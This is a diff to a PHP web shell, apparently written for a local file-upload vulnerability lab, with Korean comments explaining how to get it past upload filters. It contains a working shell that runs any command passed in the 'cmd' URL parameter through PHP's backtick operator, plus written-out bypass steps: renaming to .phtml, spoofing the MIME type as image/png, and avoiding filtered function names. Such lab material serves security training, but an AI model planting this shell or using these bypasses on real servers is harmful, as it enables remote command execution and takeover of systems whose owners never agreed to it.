@@ -4,15 +4,18 @@
  *
  * 우회 기법:
  * 1. .phtml 확장자 사용 (.php 차단 우회)
- * 2. 백틱(`) 연산자 사용 (함수명 차단 우회)
+ * 2. MIME 타입을 image/png로 조작
+ * 3. PHP 백틱 연산자로 명령 실행
  *
  * 설명:
- * - PHP의 백틱 연산자는 쉘 명령을 실행합니다
- * - system, exec 등의 함수명을 사용하지 않으므로 키워드 필터 우회
+ * - 백틱(`)은 PHP에서 쉘 명령을 실행하는 연산자입니다
+ * - system(), exec() 등의 함수 대신 사용 가능
  *
  * 사용법:
  * 1. 확장자를 .txt에서 .phtml로 변경
- * 2. Level 2 선택 후 업로드
+ * 2. Level 2 선택
+ * 3. MIME 타입을 image/png로 조작하여 업로드
+ * 4. 브라우저에서 접근: http://localhost:8080/uploads/shell.phtml?cmd=pwd
  */
 
 if (isset($_GET['cmd'])) {
@@ -20,6 +23,19 @@ if (isset($_GET['cmd'])) {
     echo `{$_GET['cmd']}`;
     echo "</pre>";
 } else {
-    echo "Backtick Shell - Ready<br>Usage: ?cmd=ls -la";
+    ?>
+    <html>
+    <head>
+        <style>
+            body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
+        </style>
+    </head>
+    <body>
+        <h3>Backtick Operator Shell</h3>
+        <p>Usage: ?cmd=ls -la</p>
+        <p>Current directory: <?php echo getcwd(); ?></p>
+    </body>
+    </html>
+    <?php
 }
 ?>
